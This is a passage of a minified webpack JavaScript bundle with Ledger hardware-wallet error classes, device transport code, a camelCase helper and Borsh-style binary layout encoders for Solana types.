/*! For license information please see main.551630ec.js.LICENSE.txt */
(() => {
    var __webpack_modules__ = {
            2600: (e, t, n) => {
                "use strict";
                n.r(t), n.d(t, {
                    AccountNameRequiredError: () => h,
                    AccountNotSupported: () => d,
                    AmountRequired: () => p,
                    BluetoothRequired: () => y,
                    BtcUnmatchedApp: () => g,
                    CantOpenDevice: () => m,
                    CantScanQRCode: () => Fe,
                    CashAddrNotSupported: () => w,
                    CurrencyNotSupported: () => b,
                    DBNotReset: () => $e,
                    DBWrongPassword: () => Xe,
                    DeviceAppVerifyNotSupported: () => v,
                    DeviceExtractOnboardingStateError: () => C,
                    DeviceGenuineSocketEarlyClose: () => A,
                    DeviceHalted: () => I,
                    DeviceInOSUExpected: () => S,
                    DeviceNameInvalid: () => x,
                    DeviceNotGenuineError: () => k,
                    DeviceOnDashboardExpected: () => _,
                    DeviceOnDashboardUnexpected: () => E,
                    DeviceOnboardingStatePollingError: () => P,
                    DeviceShouldStayInApp: () => Ne,
                    DeviceSocketFail: () => M,
                    DeviceSocketNoBulkStatus: () => B,
                    DisconnectedDevice: () => T,
                    DisconnectedDeviceDuringOperation: () => O,
                    ETHAddressNonEIP: () => je,
                    EnpointConfigError: () => L,
                    EthAppPleaseEnableContractData: () => N,
                    FeeEstimationFailed: () => R,
                    FeeNotLoaded: () => He,
                    FeeRequired: () => We,
                    FeeTooHigh: () => Ke,
                    FirmwareNotRecognized: () => D,
                    FirmwareOrAppUpdateRequired: () => Ze,
                    GasLessThanEstimate: () => fe,
                    GenuineCheckFailed: () => Qe,
                    HardResetFail: () => z,
                    InvalidAddress: () => j,
                    InvalidAddressBecauseDestinationIsAlsoSource: () => F,
                    InvalidXRPTag: () => U,
                    LatestMCUInstalledError: () => H,
                    LedgerAPI4xx: () => Ge,
                    LedgerAPI5xx: () => Ye,
                    LedgerAPIError: () => K,
                    LedgerAPIErrorWithMessage: () => q,
                    LedgerAPINotAvailable: () => V,
                    MCUNotGenuineToDashboard: () => we,
                    ManagerAppAlreadyInstalledError: () => Q,
                    ManagerAppDepInstallRequired: () => Y,
                    ManagerAppDepUninstallRequired: () => Z,
                    ManagerAppRelyOnBTCError: () => G,
                    ManagerDeviceLockedError: () => J,
                    ManagerFirmwareNotEnoughSpaceError: () => X,
                    ManagerNotEnoughSpaceError: () => $,
                    ManagerUninstallBTCDep: () => ee,
                    NetworkDown: () => te,
                    NoAccessToCamera: () => ue,
                    NoAddressesFound: () => ne,
                    NoDBPathGiven: () => Je,
                    NotEnoughBalance: () => re,
                    NotEnoughBalanceBecauseDestinationNotCreated: () => ae,
                    NotEnoughBalanceInParentAccount: () => oe,
                    NotEnoughBalanceToDelegate: () => ie,
                    NotEnoughGas: () => ce,
                    NotEnoughSpendableBalance: () => se,
                    NotSupportedLegacyAddress: () => le,
                    PairingFailed: () => Ve,
                    PasswordIncorrectError: () => de,
                    PasswordsDontMatchError: () => he,
                    RecipientRequired: () => be,
                    RecommendSubAccountsToEmpty: () => pe,
                    RecommendUndelegation: () => ye,
                    StatusCodes: () => tt,
                    SyncError: () => qe,
                    TimeoutTagged: () => ge,
                    TransportError: () => et,
                    TransportInterfaceNotAvailable: () => Ce,
                    TransportOpenUserCancelled: () => Oe,
                    TransportRaceCondition: () => Pe,
                    TransportStatusError: () => rt,
                    TransportWebUSBGestureRequired: () => Le,
                    UnavailableTezosOriginatedAccountReceive: () => ve,
                    UnavailableTezosOriginatedAccountSend: () => Ae,
                    UnexpectedBootloader: () => me,
                    UnknownMCU: () => W,
                    UpdateFetchFileFail: () => ke,
                    UpdateIncorrectHash: () => _e,
                    UpdateIncorrectSig: () => Ee,
                    UpdateYourApp: () => Se,
                    UserRefusedAddress: () => xe,
                    UserRefusedAllowManager: () => Be,
                    UserRefusedDeviceNameChange: () => Ie,
                    UserRefusedFirmwareUpdate: () => Me,
                    UserRefusedOnDevice: () => Te,
                    WebsocketConnectionError: () => Re,
                    WebsocketConnectionFailed: () => De,
                    WrongAppForCurrency: () => Ue,
                    WrongDeviceForAccount: () => ze,
                    addCustomErrorDeserializer: () => a,
                    createCustomErrorClass: () => u,
                    deserializeError: () => c,
                    getAltStatusMessage: () => nt,
                    serializeError: () => l
                });
                var r = function() {
                        var e = function(t, n) {
                            return e = Object.setPrototypeOf || {
                                __proto__: []
                            }
                            instanceof Array && function(e, t) {
                                e.__proto__ = t
                            } || function(e, t) {
                                for (var n in t) Object.prototype.hasOwnProperty.call(t, n) && (e[n] = t[n])
                            }, e(t, n)
                        };
                        return function(t, n) {
                            if ("function" !== typeof n && null !== n) throw new TypeError("Class extends value " + String(n) + " is not a constructor or null");

                            function r() {
                                this.constructor = t
                            }
                            e(t, n), t.prototype = null === n ? Object.create(n) : (r.prototype = n.prototype, new r)
                        }
                    }(),
                    i = function(e) {
                        var t = "function" === typeof Symbol && Symbol.iterator,
                            n = t && e[t],
                            r = 0;
                        if (n) return n.call(e);
                        if (e && "number" === typeof e.length) return {
                            next: function() {
                                return e && r >= e.length && (e = void 0), {
                                    value: e && e[r++],
                                    done: !e
                                }
                            }
                        };
                        throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.")
                    },
                    o = {},
                    s = {},
                    a = function(e, t) {
                        s[e] = t
                    },
                    u = function(e) {
                        var t = function(t) {
                            function n(r, i, o) {
                                var s, a = t.call(this, r || e, o) || this;
                                for (var u in Object.setPrototypeOf(a, n.prototype), a.name = e, i) a[u] = i[u];
                                if (null !== (s = o) && "object" === typeof s && "cause" in o && !("cause" in a)) {
                                    var c = o.cause;
                                    a.cause = c, "stack" in c && (a.stack = a.stack + "\nCAUSE: " + c.stack)
                                }
                                return a
                            }
                            return r(n, t), n
                        }(Error);
                        return o[e] = t, t
                    };
                var c = function(e) {
                        if ("object" === typeof e && e) {
                            try {
                                var t = JSON.parse(e.message);
                                t.message && t.name && (e = t)
                            } catch (f) {}
                            var n = void 0;
                            if ("string" === typeof e.name) {
                                var r = e.name,
                                    i = s[r];
                                if (i) n = i(e);
                                else {
                                    var a = "Error" === r ? Error : o[r];
                                    a || (console.warn("deserializing an unknown class '" + r + "'"), a = u(r)), n = Object.create(a.prototype);
                                    try {
                                        for (var l in e) e.hasOwnProperty(l) && (n[l] = e[l])
                                    } catch (f) {}
                                }
                            } else n = new Error(e.message);
                            return !n.stack && Error.captureStackTrace && Error.captureStackTrace(n, c), n
                        }
                        return new Error(String(e))
                    },
                    l = function(e) {
                        return e ? "object" === typeof e ? f(e, []) : "function" === typeof e ? "[Function: ".concat(e.name || "anonymous", "]") : e : e
                    };

                function f(e, t) {
                    var n, r, o = {};
                    t.push(e);
                    try {
                        for (var s = i(Object.keys(e)), a = s.next(); !a.done; a = s.next()) {
                            var u = a.value,
                                c = e[u];
                            "function" !== typeof c && (c && "object" === typeof c ? -1 !== t.indexOf(e[u]) ? o[u] = "[Circular]" : o[u] = f(e[u], t.slice(0)) : o[u] = c)
                        }
                    } catch (l) {
                        n = {
                            error: l
                        }
                    } finally {
                        try {
                            a && !a.done && (r = s.return) && r.call(s)
                        } finally {
                            if (n) throw n.error
                        }
                    }
                    return "string" === typeof e.name && (o.name = e.name), "string" === typeof e.message && (o.message = e.message), "string" === typeof e.stack && (o.stack = e.stack), o
                }
                var h = u("AccountNameRequired"),
                    d = u("AccountNotSupported"),
                    p = u("AmountRequired"),
                    y = u("BluetoothRequired"),
                    g = u("BtcUnmatchedApp"),
                    m = u("CantOpenDevice"),
                    w = u("CashAddrNotSupported"),
                    b = u("CurrencyNotSupported"),
                    v = u("DeviceAppVerifyNotSupported"),
                    A = u("DeviceGenuineSocketEarlyClose"),
                    k = u("DeviceNotGenuine"),
                    _ = u("DeviceOnDashboardExpected"),
                    E = u("DeviceOnDashboardUnexpected"),
                    S = u("DeviceInOSUExpected"),
                    I = u("DeviceHalted"),
                    x = u("DeviceNameInvalid"),
                    M = u("DeviceSocketFail"),
                    B = u("DeviceSocketNoBulkStatus"),
                    T = u("DisconnectedDevice"),
                    O = u("DisconnectedDeviceDuringOperation"),
                    C = u("DeviceExtractOnboardingStateError"),
                    P = u("DeviceOnboardingStatePollingError"),
                    L = u("EnpointConfig"),
                    N = u("EthAppPleaseEnableContractData"),
                    R = u("FeeEstimationFailed"),
                    D = u("FirmwareNotRecognized"),
                    z = u("HardResetFail"),
                    U = u("InvalidXRPTag"),
                    j = u("InvalidAddress"),
                    F = u("InvalidAddressBecauseDestinationIsAlsoSource"),
                    H = u("LatestMCUInstalledError"),
                    W = u("UnknownMCU"),
                    K = u("LedgerAPIError"),
                    q = u("LedgerAPIErrorWithMessage"),
                    V = u("LedgerAPINotAvailable"),
                    Q = u("ManagerAppAlreadyInstalled"),
                    G = u("ManagerAppRelyOnBTC"),
                    Y = u("ManagerAppDepInstallRequired"),
                    Z = u("ManagerAppDepUninstallRequired"),
                    J = u("ManagerDeviceLocked"),
                    X = u("ManagerFirmwareNotEnoughSpace"),
                    $ = u("ManagerNotEnoughSpace"),
                    ee = u("ManagerUninstallBTCDep"),
                    te = u("NetworkDown"),
                    ne = u("NoAddressesFound"),
                    re = u("NotEnoughBalance"),
                    ie = u("NotEnoughBalanceToDelegate"),
                    oe = u("NotEnoughBalanceInParentAccount"),
                    se = u("NotEnoughSpendableBalance"),
                    ae = u("NotEnoughBalanceBecauseDestinationNotCreated"),
                    ue = u("NoAccessToCamera"),
                    ce = u("NotEnoughGas"),
                    le = u("NotSupportedLegacyAddress"),
                    fe = u("GasLessThanEstimate"),
                    he = u("PasswordsDontMatch"),
                    de = u("PasswordIncorrect"),
                    pe = u("RecommendSubAccountsToEmpty"),
                    ye = u("RecommendUndelegation"),
                    ge = u("TimeoutTagged"),
                    me = u("UnexpectedBootloader"),
                    we = u("MCUNotGenuineToDashboard"),
                    be = u("RecipientRequired"),
                    ve = u("UnavailableTezosOriginatedAccountReceive"),
                    Ae = u("UnavailableTezosOriginatedAccountSend"),
                    ke = u("UpdateFetchFileFail"),
                    _e = u("UpdateIncorrectHash"),
                    Ee = u("UpdateIncorrectSig"),
                    Se = u("UpdateYourApp"),
                    Ie = u("UserRefusedDeviceNameChange"),
                    xe = u("UserRefusedAddress"),
                    Me = u("UserRefusedFirmwareUpdate"),
                    Be = u("UserRefusedAllowManager"),
                    Te = u("UserRefusedOnDevice"),
                    Oe = u("TransportOpenUserCancelled"),
                    Ce = u("TransportInterfaceNotAvailable"),
                    Pe = u("TransportRaceCondition"),
                    Le = u("TransportWebUSBGestureRequired"),
                    Ne = u("DeviceShouldStayInApp"),
                    Re = u("WebsocketConnectionError"),
                    De = u("WebsocketConnectionFailed"),
                    ze = u("WrongDeviceForAccount"),
                    Ue = u("WrongAppForCurrency"),
                    je = u("ETHAddressNonEIP"),
                    Fe = u("CantScanQRCode"),
                    He = u("FeeNotLoaded"),
                    We = u("FeeRequired"),
                    Ke = u("FeeTooHigh"),
                    qe = u("SyncError"),
                    Ve = u("PairingFailed"),
                    Qe = u("GenuineCheckFailed"),
                    Ge = u("LedgerAPI4xx"),
                    Ye = u("LedgerAPI5xx"),
                    Ze = u("FirmwareOrAppUpdateRequired"),
                    Je = u("NoDBPathGiven"),
                    Xe = u("DBWrongPassword"),
                    $e = u("DBNotReset");

                function et(e, t) {
                    this.name = "TransportError", this.message = e, this.stack = (new Error).stack, this.id = t
                }
                et.prototype = new Error, a("TransportError", (function(e) {
                    return new et(e.message, e.id)
                }));
                var tt = {
                    PIN_REMAINING_ATTEMPTS: 25536,
                    INCORRECT_LENGTH: 26368,
                    MISSING_CRITICAL_PARAMETER: 26624,
                    COMMAND_INCOMPATIBLE_FILE_STRUCTURE: 27009,
                    SECURITY_STATUS_NOT_SATISFIED: 27010,
                    CONDITIONS_OF_USE_NOT_SATISFIED: 27013,
                    INCORRECT_DATA: 27264,
                    NOT_ENOUGH_MEMORY_SPACE: 27268,
                    REFERENCED_DATA_NOT_FOUND: 27272,
                    FILE_ALREADY_EXISTS: 27273,
                    INCORRECT_P1_P2: 27392,
                    INS_NOT_SUPPORTED: 27904,
                    CLA_NOT_SUPPORTED: 28160,
                    TECHNICAL_PROBLEM: 28416,
                    OK: 36864,
                    MEMORY_PROBLEM: 37440,
                    NO_EF_SELECTED: 37888,
                    INVALID_OFFSET: 37890,
                    FILE_NOT_FOUND: 37892,
                    INCONSISTENT_FILE: 37896,
                    ALGORITHM_NOT_SUPPORTED: 38020,
                    INVALID_KCV: 38021,
                    CODE_NOT_INITIALIZED: 38914,
                    ACCESS_CONDITION_NOT_FULFILLED: 38916,
                    CONTRADICTION_SECRET_CODE_STATUS: 38920,
                    CONTRADICTION_INVALIDATION: 38928,
                    CODE_BLOCKED: 38976,
                    MAX_VALUE_REACHED: 38992,
                    GP_AUTH_FAILED: 25344,
                    LICENSING: 28482,
                    HALTED: 28586
                };

                function nt(e) {
                    switch (e) {
                        case 26368:
                            return "Incorrect length";
                        case 26624:
                            return "Missing critical parameter";
                        case 27010:
                            return "Security not satisfied (dongle locked or have invalid access rights)";
                        case 27013:
                            return "Condition of use not satisfied (denied by the user?)";
                        case 27264:
                            return "Invalid data received";
                        case 27392:
                            return "Invalid parameter received"
                    }
                    if (28416 <= e && e <= 28671) return "Internal error, please report"
                }

                function rt(e) {
                    this.name = "TransportStatusError";
                    var t = Object.keys(tt).find((function(t) {
                            return tt[t] === e
                        })) || "UNKNOWN_ERROR",
                        n = nt(e) || t,
                        r = e.toString(16);
                    this.message = "Ledger device: ".concat(n, " (0x").concat(r, ")"), this.stack = (new Error).stack, this.statusCode = e, this.statusText = t
                }
                rt.prototype = new Error, a("TransportStatusError", (function(e) {
                    return new rt(e.statusCode)
                }))
            },
            670: (e, t, n) => {
                "use strict";
                n.d(t, {
                    WC: () => o.StatusCodes,
                    ZP: () => f,
                    rZ: () => o.TransportStatusError
                });
                var r = n(7465),
                    i = n.n(r),
                    o = n(2600),
                    s = function(e, t, n, r) {
                        return new(n || (n = Promise))((function(i, o) {
                            function s(e) {
                                try {
                                    u(r.next(e))
                                } catch (t) {
                                    o(t)
                                }
                            }

                            function a(e) {
                                try {
                                    u(r.throw(e))
                                } catch (t) {
                                    o(t)
                                }
                            }

                            function u(e) {
                                var t;
                                e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                                    e(t)
                                }))).then(s, a)
                            }
                            u((r = r.apply(e, t || [])).next())
                        }))
                    },
                    a = function(e, t) {
                        var n, r, i, o, s = {
                            label: 0,
                            sent: function() {
                                if (1 & i[0]) throw i[1];
                                return i[1]
                            },
                            trys: [],
                            ops: []
                        };
                        return o = {
                            next: a(0),
                            throw: a(1),
                            return: a(2)
                        }, "function" === typeof Symbol && (o[Symbol.iterator] = function() {
                            return this
                        }), o;

                        function a(o) {
                            return function(a) {
                                return function(o) {
                                    if (n) throw new TypeError("Generator is already executing.");
                                    for (; s;) try {
                                        if (n = 1, r && (i = 2 & o[0] ? r.return : o[0] ? r.throw || ((i = r.return) && i.call(r), 0) : r.next) && !(i = i.call(r, o[1])).done) return i;
                                        switch (r = 0, i && (o = [2 & o[0], i.value]), o[0]) {
                                            case 0:
                                            case 1:
                                                i = o;
                                                break;
                                            case 4:
                                                return s.label++, {
                                                    value: o[1],
                                                    done: !1
                                                };
                                            case 5:
                                                s.label++, r = o[1], o = [0];
                                                continue;
                                            case 7:
                                                o = s.ops.pop(), s.trys.pop();
                                                continue;
                                            default:
                                                if (!(i = (i = s.trys).length > 0 && i[i.length - 1]) && (6 === o[0] || 2 === o[0])) {
                                                    s = 0;
                                                    continue
                                                }
                                                if (3 === o[0] && (!i || o[1] > i[0] && o[1] < i[3])) {
                                                    s.label = o[1];
                                                    break
                                                }
                                                if (6 === o[0] && s.label < i[1]) {
                                                    s.label = i[1], i = o;
                                                    break
                                                }
                                                if (i && s.label < i[2]) {
                                                    s.label = i[2], s.ops.push(o);
                                                    break
                                                }
                                                i[2] && s.ops.pop(), s.trys.pop();
                                                continue
                                        }
                                        o = t.call(e, s)
                                    } catch (a) {
                                        o = [6, a], r = 0
                                    } finally {
                                        n = i = 0
                                    }
                                    if (5 & o[0]) throw o[1];
                                    return {
                                        value: o[0] ? o[1] : void 0,
                                        done: !0
                                    }
                                }([o, a])
                            }
                        }
                    },
                    u = function(e, t) {
                        var n = "function" === typeof Symbol && e[Symbol.iterator];
                        if (!n) return e;
                        var r, i, o = n.call(e),
                            s = [];
                        try {
                            for (;
                                (void 0 === t || t-- > 0) && !(r = o.next()).done;) s.push(r.value)
                        } catch (a) {
                            i = {
                                error: a
                            }
                        } finally {
                            try {
                                r && !r.done && (n = o.return) && n.call(o)
                            } finally {
                                if (i) throw i.error
                            }
                        }
                        return s
                    },
                    c = function(e, t, n) {
                        if (n || 2 === arguments.length)
                            for (var r, i = 0, o = t.length; i < o; i++) !r && i in t || (r || (r = Array.prototype.slice.call(t, 0, i)), r[i] = t[i]);
                        return e.concat(r || Array.prototype.slice.call(t))
                    },
                    l = function(e) {
                        var t = "function" === typeof Symbol && Symbol.iterator,
                            n = t && e[t],
                            r = 0;
                        if (n) return n.call(e);
                        if (e && "number" === typeof e.length) return {
                            next: function() {
                                return e && r >= e.length && (e = void 0), {
                                    value: e && e[r++],
                                    done: !e
                                }
                            }
                        };
                        throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.")
                    };
                const f = function() {
                    function e() {
                        var e = this;
                        this.exchangeTimeout = 3e4, this.unresponsiveTimeout = 15e3, this.deviceModel = null, this._events = new(i()), this.send = function(t, n, r, i, u, c) {
                            return void 0 === u && (u = Buffer.alloc(0)), void 0 === c && (c = [o.StatusCodes.OK]), s(e, void 0, void 0, (function() {
                                var e, s;
                                return a(this, (function(a) {
                                    switch (a.label) {
                                        case 0:
                                            if (u.length >= 256) throw new o.TransportError("data.length exceed 256 bytes limit. Got: " + u.length, "DataLengthTooBig");
                                            return [4, this.exchange(Buffer.concat([Buffer.from([t, n, r, i]), Buffer.from([u.length]), u]))];
                                        case 1:
                                            if (e = a.sent(), s = e.readUInt16BE(e.length - 2), !c.some((function(e) {
                                                    return e === s
                                                }))) throw new o.TransportStatusError(s);
                                            return [2, e]
                                    }
                                }))
                            }))
                        }, this.exchangeAtomicImpl = function(t) {
                            return s(e, void 0, void 0, (function() {
                                var e, n, r, i, s, u = this;
                                return a(this, (function(a) {
                                    switch (a.label) {
                                        case 0:
                                            if (this.exchangeBusyPromise) throw new o.TransportRaceCondition("An action was already pending on the Ledger device. Please deny or reconnect.");
                                            n = new Promise((function(t) {
                                                e = t
                                            })), this.exchangeBusyPromise = n, r = !1, i = setTimeout((function() {
                                                r = !0, u.emit("unresponsive")
                                            }), this.unresponsiveTimeout), a.label = 1;
                                        case 1:
                                            return a.trys.push([1, , 3, 4]), [4, t()];
                                        case 2:
                                            return s = a.sent(), r && this.emit("responsive"), [2, s];
                                        case 3:
                                            return clearTimeout(i), e && e(), this.exchangeBusyPromise = null, [7];
                                        case 4:
                                            return [2]
                                    }
                                }))
                            }))
                        }, this._appAPIlock = null
                    }
                    return e.prototype.exchange = function(e) {
                        throw new Error("exchange not implemented")
                    }, e.prototype.setScrambleKey = function(e) {}, e.prototype.close = function() {
                        return Promise.resolve()
                    }, e.prototype.on = function(e, t) {
                        this._events.on(e, t)
                    }, e.prototype.off = function(e, t) {
                        this._events.removeListener(e, t)
                    }, e.prototype.emit = function(e) {
                        for (var t, n = [], r = 1; r < arguments.length; r++) n[r - 1] = arguments[r];
                        (t = this._events).emit.apply(t, c([e], u(n), !1))
                    }, e.prototype.setDebugMode = function() {
                        console.warn("setDebugMode is deprecated. use @ledgerhq/logs instead. No logs are emitted in this anymore.")
                    }, e.prototype.setExchangeTimeout = function(e) {
                        this.exchangeTimeout = e
                    }, e.prototype.setExchangeUnresponsiveTimeout = function(e) {
                        this.unresponsiveTimeout = e
                    }, e.create = function(e, t) {
                        var n = this;
                        return void 0 === e && (e = 3e3), new Promise((function(r, i) {
                            var s = !1,
                                a = n.listen({
                                    next: function(t) {
                                        s = !0, a && a.unsubscribe(), u && clearTimeout(u), n.open(t.descriptor, e).then(r, i)
                                    },
                                    error: function(e) {
                                        u && clearTimeout(u), i(e)
                                    },
                                    complete: function() {
                                        u && clearTimeout(u), s || i(new o.TransportError(n.ErrorMessage_NoDeviceFound, "NoDeviceFound"))
                                    }
                                }),
                                u = t ? setTimeout((function() {
                                    a.unsubscribe(), i(new o.TransportError(n.ErrorMessage_ListenTimeout, "ListenTimeout"))
                                }), t) : null
                        }))
                    }, e.prototype.decorateAppAPIMethods = function(e, t, n) {
                        var r, i;
                        try {
                            for (var o = l(t), s = o.next(); !s.done; s = o.next()) {
                                var a = s.value;
                                e[a] = this.decorateAppAPIMethod(a, e[a], e, n)
                            }
                        } catch (u) {
                            r = {
                                error: u
                            }
                        } finally {
                            try {
                                s && !s.done && (i = o.return) && i.call(o)
                            } finally {
                                if (r) throw r.error
                            }
                        }
                    }, e.prototype.decorateAppAPIMethod = function(e, t, n, r) {
                        var i = this;
                        return function() {
                            for (var u = [], c = 0; c < arguments.length; c++) u[c] = arguments[c];
                            return s(i, void 0, void 0, (function() {
                                var i;
                                return a(this, (function(s) {
                                    switch (s.label) {
                                        case 0:
                                            if (i = this._appAPIlock) return [2, Promise.reject(new o.TransportError("Ledger Device is busy (lock " + i + ")", "TransportLocked"))];
                                            s.label = 1;
                                        case 1:
                                            return s.trys.push([1, , 3, 4]), this._appAPIlock = e, this.setScrambleKey(r), [4, t.apply(n, u)];
                                        case 2:
                                            return [2, s.sent()];
                                        case 3:
                                            return this._appAPIlock = null, [7];
                                        case 4:
                                            return [2]
                                    }
                                }))
                            }))
                        }
                    }, e.ErrorMessage_ListenTimeout = "No Ledger device found (timeout)", e.ErrorMessage_NoDeviceFound = "No Ledger device found", e
                }()
            },
            8034: e => {
                "use strict";
                const t = (e, t) => {
                    if ("string" !== typeof e && !Array.isArray(e)) throw new TypeError("Expected the input to be `string | string[]`");
                    t = Object.assign({
                        pascalCase: !1
                    }, t);
                    if (e = Array.isArray(e) ? e.map((e => e.trim())).filter((e => e.length)).join("-") : e.trim(), 0 === e.length) return "";
                    if (1 === e.length) return t.pascalCase ? e.toUpperCase() : e.toLowerCase();
                    return e !== e.toLowerCase() && (e = (e => {
                        let t = !1,
                            n = !1,
                            r = !1;
                        for (let i = 0; i < e.length; i++) {
                            const o = e[i];
                            t && /[a-zA-Z]/.test(o) && o.toUpperCase() === o ? (e = e.slice(0, i) + "-" + e.slice(i), t = !1, r = n, n = !0, i++) : n && r && /[a-zA-Z]/.test(o) && o.toLowerCase() === o ? (e = e.slice(0, i - 1) + "-" + e.slice(i - 1), r = n, n = !1, t = !0) : (t = o.toLowerCase() === o && o.toUpperCase() !== o, r = n, n = o.toUpperCase() === o && o.toLowerCase() !== o)
                        }
                        return e
                    })(e)), e = e.replace(/^[_.\- ]+/, "").toLowerCase().replace(/[_.\- ]+(\w|$)/g, ((e, t) => t.toUpperCase())).replace(/\d+(\w|$)/g, (e => e.toUpperCase())), n = e, t.pascalCase ? n.charAt(0).toUpperCase() + n.slice(1) : n;
                    var n
                };
                e.exports = t, e.exports.default = t
            },
            3472: function(e, t, n) {
                "use strict";
                var r = this && this.__importDefault || function(e) {
                    return e && e.__esModule ? e : {
                        default: e
                    }
                };
                Object.defineProperty(t, "__esModule", {
                    value: !0
                }), t.map = t.array = t.rustEnum = t.str = t.vecU8 = t.tagged = t.vec = t.bool = t.option = t.publicKey = t.i128 = t.u128 = t.i64 = t.u64 = t.struct = t.f64 = t.f32 = t.i32 = t.u32 = t.i16 = t.u16 = t.i8 = t.u8 = void 0;
                const i = n(7772),
                    o = n(9679),
                    s = r(n(518));
                var a = n(7772);
                Object.defineProperty(t, "u8", {
                    enumerable: !0,
                    get: function() {
                        return a.u8
                    }
                }), Object.defineProperty(t, "i8", {
                    enumerable: !0,
                    get: function() {
                        return a.s8
                    }
                }), Object.defineProperty(t, "u16", {
                    enumerable: !0,
                    get: function() {
                        return a.u16
                    }
                }), Object.defineProperty(t, "i16", {
                    enumerable: !0,
                    get: function() {
                        return a.s16
                    }
                }), Object.defineProperty(t, "u32", {
                    enumerable: !0,
                    get: function() {
                        return a.u32
                    }
                }), Object.defineProperty(t, "i32", {
                    enumerable: !0,
                    get: function() {
                        return a.s32
                    }
                }), Object.defineProperty(t, "f32", {
                    enumerable: !0,
                    get: function() {
                        return a.f32
                    }
                }), Object.defineProperty(t, "f64", {
                    enumerable: !0,
                    get: function() {
                        return a.f64
                    }
                }), Object.defineProperty(t, "struct", {
                    enumerable: !0,
                    get: function() {
                        return a.struct
                    }
                });
                class u extends i.Layout {
                    constructor(e, t, n) {
                        super(e, n), this.blob = i.blob(e), this.signed = t
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = new s.default(this.blob.decode(e, t), 10, "le");
                        return this.signed ? n.fromTwos(8 * this.span).clone() : n
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return this.signed && (e = e.toTwos(8 * this.span)), this.blob.encode(e.toArrayLike(Buffer, "le", this.span), t, n)
                    }
                }

                function c(e) {
                    return new u(8, !1, e)
                }
                t.u64 = c, t.i64 = function(e) {
                    return new u(8, !0, e)
                }, t.u128 = function(e) {
                    return new u(16, !1, e)
                }, t.i128 = function(e) {
                    return new u(16, !0, e)
                };
                class l extends i.Layout {
                    constructor(e, t, n, r) {
                        super(e.span, r), this.layout = e, this.decoder = t, this.encoder = n
                    }
                    decode(e, t) {
                        return this.decoder(this.layout.decode(e, t))
                    }
                    encode(e, t, n) {
                        return this.layout.encode(this.encoder(e), t, n)
                    }
                    getSpan(e, t) {
                        return this.layout.getSpan(e, t)
                    }
                }
                t.publicKey = function(e) {
                    return new l(i.blob(32), (e => new o.PublicKey(e)), (e => e.toBuffer()), e)
                };
                class f extends i.Layout {
                    constructor(e, t) {
                        super(-1, t), this.layout = e, this.discriminator = i.u8()
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return null === e || void 0 === e ? this.discriminator.encode(0, t, n) : (this.discriminator.encode(1, t, n), this.layout.encode(e, t, n + 1) + 1)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.discriminator.decode(e, t);
                        if (0 === n) return null;
                        if (1 === n) return this.layout.decode(e, t + 1);
                        throw new Error("Invalid option " + this.property)
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.discriminator.decode(e, t);
                        if (0 === n) return 1;
                        if (1 === n) return this.layout.getSpan(e, t + 1) + 1;
                        throw new Error("Invalid option " + this.property)
                    }
                }

                function h(e) {
                    if (0 === e) return !1;
                    if (1 === e) return !0;
                    throw new Error("Invalid bool: " + e)
                }

                function d(e) {
                    return e ? 1 : 0
                }

                function p(e) {
                    const t = i.u32("length"),
                        n = i.struct([t, i.blob(i.offset(t, -t.span), "data")]);
                    return new l(n, (e => {
                        let {
                            data: t
                        } = e;
                        return t
                    }), (e => ({
                        data: e
                    })), e)
                }
                t.option = function(e, t) {
                    return new f(e, t)
                }, t.bool = function(e) {
                    return new l(i.u8(), h, d, e)
                }, t.vec = function(e, t) {
                    const n = i.u32("length"),
                        r = i.struct([n, i.seq(e, i.offset(n, -n.span), "values")]);
                    return new l(r, (e => {
                        let {
                            values: t
                        } = e;
                        return t
                    }), (e => ({
                        values: e
                    })), t)
                }, t.tagged = function(e, t, n) {
                    const r = i.struct([c("tag"), t.replicate("data")]);
                    return new l(r, (function(t) {
                        let {
                            tag: n,
                            data: r
                        } = t;
                        if (!n.eq(e)) throw new Error("Invalid tag, expected: " + e.toString("hex") + ", got: " + n.toString("hex"));
                        return r
                    }), (t => ({
                        tag: e,
                        data: t
                    })), n)
                }, t.vecU8 = p, t.str = function(e) {
                    return new l(p(), (e => e.toString("utf-8")), (e => Buffer.from(e, "utf-8")), e)
                }, t.rustEnum = function(e, t, n) {
                    const r = i.union(null !== n && void 0 !== n ? n : i.u8(), t);
                    return e.forEach(((e, t) => r.addVariant(t, e, e.property))), r
                }, t.array = function(e, t, n) {
                    const r = i.struct([i.seq(e, t, "values")]);
                    return new l(r, (e => {
                        let {
                            values: t
                        } = e;
                        return t
                    }), (e => ({
                        values: e
                    })), n)
                };
                class y extends i.Layout {
                    constructor(e, t, n) {
                        super(e.span + t.span, n), this.keyLayout = e, this.valueLayout = t
                    }
                    decode(e, t) {
                        t = t || 0;
                        return [this.keyLayout.decode(e, t), this.valueLayout.decode(e, t + this.keyLayout.getSpan(e, t))]
                    }
                    encode(e, t, n) {
                        n = n || 0;
                        const r = this.keyLayout.encode(e[0], t, n);
                        return r + this.valueLayout.encode(e[1], t, n + r)
                    }
                    getSpan(e, t) {
                        return this.keyLayout.getSpan(e, t) + this.valueLayout.getSpan(e, t)
                    }
                }
                t.map = function(e, t, n) {
                    const r = i.u32("length"),
                        o = i.struct([r, i.seq(new y(e, t), i.offset(r, -r.span), "values")]);
                    return new l(o, (e => {
                        let {
                            values: t
                        } = e;
                        return new Map(t)
                    }), (e => ({
                        values: Array.from(e.entries())
                    })), n)
                }
            },
            2576: (e, t, n) => {
                "use strict";
                t._O = t.Jq = t.KB = t.u8 = t.cv = void 0, t.Ik = t.A9 = t.n_ = t.gM = void 0;
                const r = n(9778);

                function i(e) {
                    if (!(e instanceof Uint8Array)) throw new TypeError("b must be a Uint8Array")
                }

                function o(e) {
                    return i(e), r.Buffer.from(e.buffer, e.byteOffset, e.length)
                }
                class s {
                    constructor(e, t) {
                        if (!Number.isInteger(e)) throw new TypeError("span must be an integer");
                        this.span = e, this.property = t
